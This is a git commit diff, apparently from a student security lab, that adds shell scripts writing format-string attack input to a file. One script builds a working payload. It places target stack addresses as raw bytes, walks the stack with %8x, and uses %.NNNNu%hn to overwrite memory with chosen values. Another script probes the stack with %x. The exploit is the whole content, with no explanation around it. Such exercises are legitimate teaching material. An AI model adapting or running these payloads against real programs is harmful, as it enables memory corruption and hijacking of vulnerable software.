8fa9bb5f4821048089d56018391b2c94a603de18
Qmm <1259598502@qq.com>
2025-04-20 21:13:40 +0800

    qc

---
+++ exp4/sh/3task.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+echo $(printf "\x64\xe9\xff\xbf\x64\xe9\xff\xbf\x66\xe9\xff\xbf").%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x%.4240u%hn%.4358u%hn > input
--- exp4/sh/input_12.sh
+++ exp4/sh/input_12.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
 
 echo $(printf "\x64\xe9\xff\xbf").%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x > input
+
